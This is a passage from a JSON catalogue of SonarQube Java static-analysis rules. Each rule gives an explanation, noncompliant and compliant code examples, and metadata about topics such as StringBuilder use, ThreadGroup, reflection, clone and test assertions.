</tbody>\n</table>\n<p><strong>Benchmarking code</strong></p>\n<p>The results were generated by running the following snippet with <a href=\"https://github.com/openjdk/jmh\">JMH</a>.</p>\n<pre>\n@Param({\"10\", \"100\", \"1000\"})\nint stringBuilderSize;\n\n\nprivate StringBuilder sb;\n\n@Setup(Level.Iteration)\npublic void setup() {\n  sb = new StringBuilder();\n  IntStream.range(0, stringBuilderSize).forEach(i -&gt; sb.append(\"word\"));\n}\n\n@Benchmark\npublic StringBuilder toStringEquals() {\n  if (\"\".equals((sb.toString()))) {\n    return sb;\n  }\n  return new StringBuilder();\n}\n\n@Benchmark\npublic StringBuilder toStringIsEmpty() {\n  if (sb.toString().isEmpty()) {\n    return sb;\n  }\n  return new StringBuilder();\n}\n\n@Benchmark\npublic StringBuilder length() {\n  if (sb.length() == 0) {\n    return sb;\n  }\n  return new StringBuilder();\n}\n\n@Benchmark\npublic StringBuilder isEmpty() {\n  if (sb.isEmpty()) {\n    return sb;\n  }\n  return new StringBuilder();\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"partial","ruleKey":"RSPEC-3033","summary":"\".isEmpty\" should be used to test for the emptiness of StringBuffers/Builders","tags":["performance","clumsy"],"versions":{"serverEdition":null,"serverVersion":null,"communityVersion":null},"cleanCodeAttribute":"EFFICIENT","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Using the standard <code>getClassLoader()</code> may not return the <em>right</em> class loader in a JEE context. Instead, go through the\n<code>currentThread</code>.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nClassLoader cl = this.getClass().getClassLoader();  // Noncompliant\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nClassLoader cl = Thread.currentThread().getContextClassLoader();\n</pre>\n\n","impacts":[{"name":"reliability","level":"LOW"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-3032","summary":"JEE applications should not \"getClassLoader\"","tags":["jee"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Importing a class statically allows you to use its <code>public static</code> members without qualifying them with the class name. That can be\nhandy, but if you import too many classes statically, your code can become confusing and difficult to maintain.</p>\n<h3>Noncompliant code example</h3>\n<p>With the default threshold value: 4</p>\n<pre>\nimport static java.lang.Math.*;\nimport static java.util.Collections.*;\nimport static com.myco.corporate.Constants.*;\nimport static com.myco.division.Constants.*;\nimport static com.myco.department.Constants.*;  // Noncompliant\n</pre>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-3030","summary":"Classes should not have too many \"static\" imports","tags":["brain-overload"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"FOCUSED","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>The use of a <code>StringBuilder</code> or <code>StringBuffer</code> makes <code>String</code> assembly more efficient than plain concatenation\nwhen you perform a large number of appends. Using <code>String</code> concatenation within <code>StringBuilder.append</code> defeats the purpose of\nthe <code>StringBuilder</code>. If you concatenate only a few strings, use direct <code>String</code> concatenation. Otherwise, replace\n<code>String</code> concatenation with calls to <code>append</code>.</p>\n<p>This rule applies to String concatenations performed repeatedly, inside loops. In such scenarios, the performance penalty associated with\ninefficient StringBuilder.append usage can multiply significantly.</p>\n<h3>Noncompliant code example</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nStringBuilder sb = new StringBuilder();\nfor (String name : names) {\n  sb.append(\"Hello : \" + name); // Noncompliant\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nStringBuilder sb = new StringBuilder();\nfor (String name : names) {\n  sb.append(\"Hello : \").append(name);\n}\n</pre>\n<h2>Resources</h2>\n<h3>Benchmarks</h3>\n<table>\n  <colgroup>\n    <col style=\"width: 25%;\">\n    <col style=\"width: 25%;\">\n    <col style=\"width: 25%;\">\n    <col style=\"width: 25%;\">\n  </colgroup>\n  <thead>\n    <tr>\n      <th>Method</th>\n      <th>Runtime</th>\n      <th>Average time</th>\n      <th>Error margin</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><p>append</p></td>\n      <td><p>Temurin 21</p></td>\n      <td><p>14.26 ns/op</p></td>\n      <td><p>Â±0.50 ns/op</p></td>\n    </tr>\n    <tr>\n      <td><p>concat</p></td>\n      <td><p>Temurin 21</p></td>\n      <td><p>17.77 ns/op</p></td>\n      <td><p>Â±0.66 ns/op</p></td>\n    </tr>\n    <tr>\n      <td><p>concatWithinBuilder</p></td>\n      <td><p>Temurin 21</p></td>\n      <td><p>31.42 ns/op</p></td>\n      <td><p>Â±1.80 ns/op</p></td>\n    </tr>\n  </tbody>\n</table>\n<p>The results were generated by running the following snippet with <a href=\"https://github.com/openjdk/jmh\">jmh</a>:</p>\n<pre>\nprivate String name1 = \"John\";\nprivate String name2 = \"Jane\";\n\n@Benchmark\npublic String concat() {\n  return name1 + \", \" + name2;\n}\n\n@Benchmark\npublic String concatWithinBuilder() {\n  return new StringBuilder()\n    .append(name1 + \", \" + name2)\n    .toString();\n}\n\n@Benchmark\npublic String append() {\n  return new StringBuilder()\n    .append(name1)\n    .append(\", \")\n    .append(name2)\n    .toString();\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"covered","ruleKey":"RSPEC-3024","summary":"Arguments to \"append\" should not be concatenated","tags":["performance","clumsy"],"versions":{"serverEdition":null,"serverVersion":null,"communityVersion":null},"cleanCodeAttribute":"EFFICIENT","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>The <code>Collection.toArray()</code> method returns an <code>Object[]</code> when no arguments are provided to it. This can lead to a\n<code>ClassCastException</code> at runtime if you try to cast the returned array to an array of a specific type. Instead, use this method by providing\nan array of the desired type as the argument.</p>\n<p>Note that passing a <code>new T[0]</code> array of length zero as the argument is more efficient than a pre-sized array <code>new\nT[size]</code>.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic String [] getStringArray(List&lt;String&gt; strings) {\n  return (String []) strings.toArray();  // Noncompliant, a ClassCastException will be thrown here\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic String [] getStringArray(List&lt;String&gt; strings) {\n  return strings.toArray(new String[0]); // Compliant, the toArray method will return an array of the desired type, and we can remove the casting operation\n}\npublic String [] getPresizedStringArray(List&lt;String&gt; strings) {\n  return strings.toArray(new String[strings.size()]); // Compliant, but slightly less efficient than the previous example\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/javase/8/docs/api/java/util/Collection.html#toArray-T:A-\">docs.oracle</a> - Collection.toArray() </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"covered","ruleKey":"RSPEC-3020","summary":"\"Collection.toArray()\" should be passed an array of the proper type","tags":[],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Blocker","description":"<h2>Why is this an issue?</h2>\n<p>The <code>ThreadGroup</code> class contains many deprecated methods like <code>allowThreadSuspension</code>, <code>resume</code>,\n<code>stop</code>, and <code>suspend</code>. Also, some of the non-deprecated methods are obsolete or not thread-safe, and still others are insecure\n(<code>activeCount</code>, <code>enumerate</code>). For these reasons, any use of <code>ThreadGroup</code> is suspicious and should be avoided.</p>\n<h2>How to fix it</h2>\n<p>Instead, use implementations of <code>java.util.concurrent.ExecutorService</code> to safely manage groups of threads.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre>\nclass NetworkHandler {\n\n  void startThreadInGroup(ThreadGroup tg) { // Noncompliant, use an ExecutorService instead, which is more secure\n    Thread thread = new Thread(tg, \"controller\");\n    thread.start();\n  }\n\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre>\nclass NetworkHandler {\n\n  void handleThreadsProperly() {\n    ThreadFactory threadFactory = Executors.defaultThreadFactory();\n    ThreadPoolExecutor executorPool = new ThreadPoolExecutor(3, 10, 5, TimeUnit.SECONDS, new ArrayBlockingQueue&lt;Runnable&gt;(2), threadFactory);\n    for (int i = 0; i &lt; 10; i++) {\n      executorPool.execute(new Thread(\"Job: \" + i));\n    }\n    executorPool.shutdown();\n  }\n\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/YzdGBQ\">CERT, THI01-J.</a> - Do not invoke ThreadGroup methods </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"BLOCKER"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-3014","summary":"\"ThreadGroup\" should not be used","tags":["design","cert","suspicious"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CONVENTIONAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>The JDK provides a set of built-in methods to copy the contents of an array into another array. Using a loop to perform the same operation is less\nclear, more verbose and should be avoided.</p>\n<h3>Exceptions</h3>\n<p>The rule detects only the most idiomatic patterns, it will not consider loops with non-trivial control flow. For example, loops that copy array\nelements conditionally are ignored.</p>\n<h2>How to fix it</h2>\n<p>You can use:</p>\n<ul>\n  <li> <code>Arrays.copyOf</code> to copy an entire array into another array </li>\n  <li> <code>System.arraycopy</code> to copy only a subset of an array into another array </li>\n  <li> <code>Arrays.asList</code> to create a new list with the contents of the array </li>\n  <li> <code>Collections.addAll</code> to add the elements of a collection into another collection </li>\n</ul>\n<p>Note that <code>Arrays.asList</code> returns a fixed-size <code>List</code>, so further steps are required if a non-fixed-size <code>List</code> is\nneeded.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic void copyArray(String[] source){\n  String[] array = new String[source.length];\n  for (int i = 0; i &lt; source.length; i++) {\n    array[i] = source[i]; // Noncompliant\n  }\n}\n\npublic void copyList(List&lt;String&gt; source) {\n  List&lt;String&gt; list = new ArrayList&lt;&gt;();\n  for (String s : source) {\n    list.add(s); // Noncompliant\n  }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic void copyArray(String[] source){\n  String[] array = Arrays.copyOf(source, source.length);\n}\n\npublic void copyList(List&lt;String&gt; source) {\n  List&lt;String&gt; list = new ArrayList&lt;&gt;();\n  Collections.addAll(list, source);\n}\n</pre>\n<pre>\npublic void makeCopiesConditional(int[] source) {\n  int[] dest = new int[source.length];\n  for (int i = 0; i &lt; source.length; i++) {\n    if (source[i] &gt; 10) {\n      dest[i] = source[i];  // Compliant, since the array elements are conditionally copied to the dest array\n    }\n  }\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a\n  href=\"https://docs.oracle.com/javase/8/docs/api/java/util/Arrays.html#copyOf-T:A-int-:~:text=1.6-,copyOf,-public%20static%C2%A0byte\">docs.oracle</a>\n  - Arrays.copyOf documentation </li>\n  <li> <a\n  href=\"https://docs.oracle.com/javase/8/docs/api/java/util/Arrays.html#asList-Tâ¦â-:~:text=1.6-,asList,-%40SafeVarargs%0Apublic%20static\">docs.oracle</a> - Arrays.asList documentation </li>\n  <li> <a\n  href=\"https://docs.oracle.com/javase/8/docs/api/java/lang/System.html#arraycopy-java.lang.Object-int-java.lang.Object-int-int-:~:text=1.5-,arraycopy,-public%20static%C2%A0void\">docs.oracle</a> - System.arraycopy documentation </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-3012","summary":"Arrays and lists should not be copied using loops","tags":["clumsy"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Altering or bypassing the accessibility of classes, methods, or fields through reflection violates the encapsulation principle. This can break the\ninternal contracts of the accessed target and lead to maintainability issues and runtime errors.</p>\n<p>This rule raises an issue when reflection is used to change the visibility of a class, method or field, and when it is used to directly update a\nfield value.</p>\n<pre>\npublic void makeItPublic(String methodName) throws NoSuchMethodException {\n\n  this.getClass().getMethod(methodName).setAccessible(true); // Noncompliant\n}\n\npublic void setItAnyway(String fieldName, int value) {\n  this.getClass().getDeclaredField(fieldName).setInt(this, value); // Noncompliant; bypasses controls in setter\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Encapsulation_(computer_programming)\">Wikipedia definition of Encapsulation</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/_jZGBQ\">CERT, SEC05-J.</a> - Do not use reflection to increase accessibility of classes,\n  methods, or fields </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-3011","summary":"Reflection should not be used to increase accessibility of classes, methods, or fields","tags":["cert"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"MODULAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Assigning a value to a <code>static</code> field in a constructor could cause unreliable behavior at runtime since it will change the value for all\ninstances of the class.</p>\n<p>Instead remove the fieldâs <code>static</code> modifier, or initialize it statically.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic class Person {\n  static Date dateOfBirth;\n  static int expectedFingers;\n\n  public Person(date birthday) {\n    dateOfBirth = birthday;  // Noncompliant; now everyone has this birthday\n    expectedFingers = 10;  // Noncompliant\n  }\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic class Person {\n  Date dateOfBirth;\n  static int expectedFingers = 10;\n\n  public Person(date birthday) {\n    dateOfBirth = birthday;\n  }\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-3010","summary":"Static fields should not be updated in constructors","tags":[],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>The Java Language Specification defines a set of rules called naming conventions that apply to Java programs. These conventions provide\nrecommendations for naming packages, classes, methods, and variables.</p>\n<p>By following shared naming conventions, teams can collaborate more efficiently.</p>\n<p>This rule checks that static non-final field names match a provided regular expression.</p>\n<h3>Noncompliant code example</h3>\n<p>The default regular expression applied by the rule is <code>^[a-z][a-zA-Z0-9]*$</code>:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic class MyClass {\n   private static String foo_bar; // Noncompliant\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic class MyClass {\n   private static String fooBar;\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://www.oreilly.com/library/view/java-8-pocket/9781491901083/ch01.html\">OâReilly - Java 8 in pocket - Naming Conventions</a> </li>\n  <li> <a href=\"https://www.educative.io/answers/what-are-the-naming-conventions-in-java\">Educative - Naming conventions in Java</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-3008","summary":"Static non-final field names should comply with a naming convention","tags":["convention"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"IDENTIFIABLE","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Blocker","description":"<p>This rule raises an issue when a class overrides the <code>Object.clone</code> method instead of resorting to a copy constructor or other copy\nmechanisms.</p>\n<h2>Why is this an issue?</h2>\n<p>The <code>Object.clone</code> / <code>java.lang.Cloneable</code> mechanism in Java should be considered broken for the following reasons and\nshould, consequently, not be used:</p>\n<ul>\n  <li> <code>Cloneable</code> is a <em>marker interface</em> without API but with a contract about class behavior that the compiler cannot enforce.\n  This is a bad practice. </li>\n  <li> Classes are instantiated without calling their constructor, so possible preconditions cannot be enforced. </li>\n  <li> There are implementation flaws by design when overriding <code>Object.clone</code>, like type casts or the handling of\n  <code>CloneNotSupportedException</code> exceptions. </li>\n</ul>\n<h2>How to fix it</h2>\n<p>A copy constructor, copy factory or a custom copy function are suitable alternatives to the <code>Object.clone</code> /\n<code>java.lang.Cloneable</code> mechanism.</p>\n<p>Consider the following example:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nclass Entity implements Cloneable { // Noncompliant, using `Cloneable`\n\n  public int value;\n  public List&lt;Entity&gt; children; // deep copy wanted\n\n  Entity() {\n    EntityManager.register(this); // invariant\n  }\n\n  @Override\n  public Entity clone() {\n    try {\n      Entity copy = (Entity) super.clone(); // invariant not enforced, because no constructor is caled\n      copy.children = children.stream().map(Entity::clone).toList();\n      return copy;\n    } catch (CloneNotSupportedException e) { // this will not happen due to behavioral contract\n      throw new AssertionError();\n    }\n  }\n}\n</pre>\n<p>The <code>Cloneable</code> / <code>Object.clone</code> mechanism could easily be replaced by copy constructor:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nclass Entity { // Compliant\n\n  public int value;\n  public List&lt;Entity&gt; children; // deep copy wanted\n\n  Entity() {\n    EntityManager.register(this); // invariant\n  }\n\n  Entity(Entity template) {\n    value = template.value;\n    children = template.children.stream().map(Entity::new).toList();\n  }\n}\n</pre>\n<p>Or by a factory method:</p>\n<pre>\nclass Entity { // Compliant\n\n  public int value;\n  public List&lt;Entity&gt; children; // deep copy wanted\n\n  Entity() {\n    EntityManager.register(this); // invariant\n  }\n\n  public static Entity create(Entity template) {\n    Entity entity = new Entity();\n    entity.value = template.value;\n    entity.children = template.children.stream().map(Entity::new).toList();\n    return Entity;\n  }\n}\n</pre>\n<p>Or by a custom <code>copy</code> function:</p>\n<pre>\nclass Entity { // Compliant\n\n  public int value;\n  public List&lt;Entity&gt; children; // deep copy wanted\n\n  Entity() {\n    EntityManager.register(this); // invariant\n  }\n\n  public Entity copy() {\n    Entity entity = new Entity();\n    entity.value = value;\n    entity.children = children.stream().map(Entity::new).toList();\n    return Entity;\n  }\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://www.artima.com/intv/bloch13.html\">Joshua Bloch - Copy Constructor versus Cloning</a> </li>\n  <li> <a href=\"https://docs.oracle.com/javase/8/docs/api/java/lang/Cloneable.html\">Interface Cloneable - Javaâ¢ Platform, Standard Edition 8 API\n  Specification</a> </li>\n  <li> <a href=\"https://docs.oracle.com/javase/8/docs/api/java/lang/Object.html#clone--\">Object.clone - Javaâ¢ Platform, Standard Edition 8 API\n  Specification</a> </li>\n</ul>\n<h3>Related rules</h3>\n<ul>\n  <li> {rule:java:S2157} - \"Cloneables\" should implement \"clone\" </li>\n  <li> {rule:java:S1182} - Classes that override \"clone\" should be \"Cloneable\" and call \"super.clone()\" </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"BLOCKER"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2975","summary":"\"clone\" should not be overridden","tags":["suspicious"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CONVENTIONAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Classes with only <code>private</code> constructors should be marked <code>final</code> to prevent any mistaken extension attempts.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic class PrivateConstructorClass {  // Noncompliant\n  private PrivateConstructorClass() {\n    // ...\n  }\n\n  public static int magic(){\n    return 42;\n  }\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic final class PrivateConstructorClass {  // Compliant\n  private PrivateConstructorClass() {\n    // ...\n  }\n\n  public static int magic(){\n    return 42;\n  }\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-2974","summary":"Classes without \"public\" constructors should be \"final\"","tags":["design"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CONVENTIONAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>The use of Unicode escape sequences should be reserved for characters that would otherwise be ambiguous, such as unprintable characters.</p>\n<p>This rule ignores sequences composed entirely of Unicode characters, but otherwise raises an issue for each Unicode character that represents a\nprintable character.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nString prefix = \"n\\u00E9e\"; // Noncompliant\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nString prefix = \"nÃ©e\";\n</pre>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-2973","summary":"Escaped Unicode characters should not be used","tags":["confusing"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Inner classes should be short and sweet, to manage complexity in the overall file. An inner class that has grown longer than a certain threshold\nshould probably be externalized to its own file.</p>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-2972","summary":"Inner classes should not have too many lines of code","tags":["architecture","brain-overload"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"FOCUSED","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Blocker","description":"<h2>Why is this an issue?</h2>\n<p>It is very easy to write incomplete assertions when using some test frameworks. This rule enforces complete assertions in the following cases:</p>\n<ul>\n  <li> Fest: <code>assertThat</code> is not followed by an assertion invocation </li>\n  <li> AssertJ: <code>assertThat</code> is not followed by an assertion invocation </li>\n  <li> Mockito: <code>verify</code> is not followed by a method invocation </li>\n  <li> Truth: <code>assertXXX</code> is not followed by an assertion invocation </li>\n</ul>\n<p>In such cases, what is intended to be a test doesnât actually verify anything</p>\n<h3>Noncompliant code example</h3>\n<pre>\n// Fest\nboolean result = performAction();\n// let's now check that result value is true\nassertThat(result); // Noncompliant; nothing is actually checked, the test passes whether \"result\" is true or false\n\n// Mockito\nList mockedList = Mockito.mock(List.class);\nmockedList.add(\"one\");\nmockedList.clear();\n// let's check that \"add\" and \"clear\" methods are actually called\nMockito.verify(mockedList); // Noncompliant; nothing is checked here, oups no call is chained to verify()\n</pre>\n<h3>Compliant solution</h3>\n<pre>\n// Fest\nboolean result = performAction();\n// let's now check that result value is true\nassertThat(result).isTrue();\n\n// Mockito\nList mockedList = Mockito.mock(List.class);\nmockedList.add(\"one\");\nmockedList.clear();\n// let's check that \"add\" and \"clear\" methods are actually called\nMockito.verify(mockedList).add(\"one\");\nMockito.verify(mockedList).clear();\n</pre>\n<h3>Exceptions</h3>\n<p>Variable assignments and return statements are skipped to allow helper methods.</p>\n<pre>\nprivate BooleanAssert check(String filename, String key) {\n  String fileContent = readFileContent(filename);\n  performReplacements(fileContent);\n  return assertThat(fileContent.contains(key)); // No issue is raised here\n}\n\n@Test\npublic void test() {\n  check(\"foo.txt\", \"key1\").isTrue();\n  check(\"bar.txt\", \"key2\").isTrue();\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"BLOCKER"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2970","summary":"Assertions should be complete","tags":["tests","assertj","mockito"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"TESTED","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Under the reasoning that cleaner code is better code, the semicolon at the end of a try-with-resources construct should be omitted because it can\nbe omitted.</p>\n<h3>Noncompliant code example</h3>\n<pre>\ntry (ByteArrayInputStream b = new ByteArrayInputStream(new byte[10]);  // ignored; this one's required\n      Reader r = new InputStreamReader(b);)   // Noncompliant\n{\n   //do stuff\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\ntry (ByteArrayInputStream b = new ByteArrayInputStream(new byte[10]);\n      Reader r = new InputStreamReader(b))\n{\n   //do stuff\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-2959","summary":"Unnecessary semicolons should be omitted","tags":["convention"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CONVENTIONAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>In asynchronous testing, the test code is written in a way that allows it to wait for the asynchronous operation to complete before continuing with\nthe test.</p>\n<p>Using <code>Thread.sleep</code> in this case can cause flaky tests, slow test execution, and inaccurate test results. It creates brittle tests that\ncan fail unpredictably depending on the environment or load.</p>\n<p>Use mocks or libraries such as <code>Awaitility</code> instead. These tools provide features such as timeouts, assertions, and error handling to\nmake it easier to write and manage asynchronous tests.</p>\n<h3>Noncompliant code example</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n@Test\npublic void testDoTheThing(){\n\n  MyClass myClass = new MyClass();\n  myClass.doTheThing();\n\n  Thread.sleep(500);  // Noncompliant\n  // assertions...\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n@Test\npublic void testDoTheThing(){\n\n  MyClass myClass = new MyClass();\n  myClass.doTheThing();\n\n  await().atMost(2, Duration.SECONDS).until(didTheThing());  // Compliant\n  // assertions...\n}\n\nprivate Callable&lt;Boolean&gt; didTheThing() {\n  return new Callable&lt;Boolean&gt;() {\n    public Boolean call() throws Exception {\n      // check the condition that must be fulfilled...\n    }\n  };\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/en/java/javase/20/docs/api/java.base/java/lang/Thread.html\">Oracle SE 20 - Thread</a> </li>\n  <li> <a href=\"http://www.awaitility.org/\">Awaitility</a> </li>\n</ul>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://www.baeldung.com/java-thread-sleep-vs-awaitility-await\">Baeldung - Thread.sleep() vs Awaitility.await()</a> </li>\n  <li> <a href=\"https://www.baeldung.com/awaitility-testing\">Baeldung - Awaitility testing</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"infeasible","ruleKey":"RSPEC-2925","summary":"\"Thread.sleep\" should not be used in tests","tags":["tests","bad-practice"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>JUnit rules are predefined classes that extend the behavior of JUnit tests, allowing to add new functionalities, such as managing resources,\nmodifying test behavior, and handling exceptions.</p>\n<p>Unused JUnit rules can lead to confusion when reading the test code, making tests harder to understand and maintain. Having unused rules can also\nslow down the test suite, as JUnit has to process the rules even though they are not being used. Some <code>TestRule</code> classes have the desired\neffect without being directly referenced by a test, while others do not. Thereâs no reason to leave them cluttering the file if theyâre not in\nuse.</p>\n<p>The rule raises an issue when in a <code>Test</code> class, there is no method referencing a declared <code>TestRule</code> of the following\ntypes:</p>\n<ul>\n  <li> <code>TemporaryFolder</code> and <code>TestName</code> in JUnit </li>\n  <li> <code>TempDir</code> and <code>TestInfo</code> in JUnit 5 </li>\n</ul>\n<h2>How to fix it</h2>\n<p>Remove the unused <code>TestRule</code> field that is expected to be referenced inside a test method.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic class ProjectDefinitionTest {\n\n  